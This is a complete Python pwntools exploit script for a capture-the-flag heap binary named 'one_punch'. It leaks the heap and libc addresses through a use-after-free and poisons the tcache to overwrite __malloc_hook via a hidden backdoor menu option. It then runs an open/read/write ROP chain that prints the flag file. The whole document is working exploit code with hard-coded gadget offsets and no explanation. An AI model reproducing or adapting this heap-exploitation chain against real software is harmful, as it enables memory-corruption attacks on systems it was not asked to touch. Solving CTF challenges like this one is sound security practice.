#coding=utf-8
from pwn import *
context.update(arch='amd64',os='linux',log_level='DEBUG')
context.terminal = ['tmux','split','-h']
debug = 1
elf = ELF('./one_punch')
libc_offset = 0x3c4b20
gadgets = [0x45216,0x4526a,0xf02a4,0xf1147]
if debug:
    libc = ELF('/lib/x86_64-linux-gnu/libc.so.6')
    p = process('./one_punch')

def Add(idx,name):
    p.recvuntil('> ')
    p.sendline('1')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("hero name: ")
    p.send(name)


def Edit(idx,name):
    p.recvuntil('> ')
    p.sendline('2')
    p.recvuntil("idx: ")
    p.sendline(str(idx))
    p.recvuntil("hero name: ")
    p.send(name)

def Show(idx):
    p.recvuntil('> ')
    p.sendline('3')
    p.recvuntil("idx: ")
    p.sendline(str(idx))

def Delete(idx):
    p.recvuntil('> ')
    p.sendline('4')
    p.recvuntil("idx: ")
    p.sendline(str(idx))

def BackDoor(buf):
    p.recvuntil('> ')
    p.sendline('50056')
    sleep(0.1)
    p.send(buf)

def exp():
    #leak heap
    for i in range(7):
        Add(0,'a'*0x120)
        Delete(0)
    Show(0)
    p.recvuntil("hero name: ")
    heap_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - 0x850
    log.success("[+]heap base => "+ hex(heap_base))
    #leak libc
    Add(0,'a'*0x120)
    Add(1,'a'*0x400)
    Delete(0)
    Show(0)
    p.recvuntil("hero name: ")
    libc_base = u64(p.recvline().strip('\n').ljust(8,'\x00')) - (0x902ca0-0x71e000)
    log.success("[+]libc base => " + hex(libc_base))
    #
    for i in range(6):
        Add(0,'a'*0xf0)
        Delete(0)
    for i in range(7):
        Add(0,'a'*0x400)
        Delete(0)
    Add(0,'a'*0x400)
    Add(1,'a'*0x400)
    Add(1,'a'*0x400)
    Add(2,'a'*0x400)
    Delete(0)#UAF
    Add(2,'a'*0x300)
    Add(2,'a'*0x300)
    #agagin
    Delete(1)#UAF
    Add(2,'a'*0x300)
    Add(2,'a'*0x300)
    Edit(2,'./flag'.ljust(8,'\x00'))
    Edit(1,'a'*0x300+p64(0)+p64(0x101)+p64(heap_base+(0x000055555555c460-0x555555559000))+p64(heap_base+0x1f))

    #trigger
    Add(0,'a'*0x217)

    Delete(0)
    Edit(0,p64(libc_base+libc.sym['__malloc_hook']))
    #gdb.attach(p,'b calloc')
    Add(0,'a'*0xf0)

    BackDoor('a')
    #mov eax, esi ; add rsp, 0x48 ; ret
    #magic_gadget = libc_base + libc.sym['setcontext']+53
    # add rsp, 0x48 ; ret
    magic_gadget = libc_base + 0x000000000008cfd6
    payload = p64(magic_gadget)

    BackDoor(payload)

    p_rdi = libc_base + 0x0000000000026542
    p_rsi = libc_base + 0x0000000000026f9e
    p_rdx = libc_base + 0x000000000012bda6
    p_rax = libc_base + 0x0000000000047cf8
    syscall = libc_base + 0x00000000000cf6c5
    rop_heap = heap_base + 0x44b0

    rops = p64(p_rdi)+p64(rop_heap)
    rops += p64(p_rsi)+p64(0)
    rops += p64(p_rdx)+p64(0)
    rops += p64(p_rax)+p64(2)
    rops += p64(syscall)
    #rops += p64(libc.sym['open'])
    #read
    rops += p64(p_rdi)+p64(3)
    rops += p64(p_rsi)+p64(heap_base+0x260)
    rops += p64(p_rdx)+p64(0x70)
    rops += p64(p_rax)+p64(0)
    rops += p64(syscall)
    #rops += p64(libc.sym['read'])
    #write
    rops += p64(p_rdi)+p64(1)
    rops += p64(p_rsi)+p64(heap_base+0x260)
    rops += p64(p_rdx)+p64(0x70)
    rops += p64(p_rax)+p64(1)
    rops += p64(syscall)
    Add(0,rops)
    p.interactive('$ xmzyshypnc')

exp()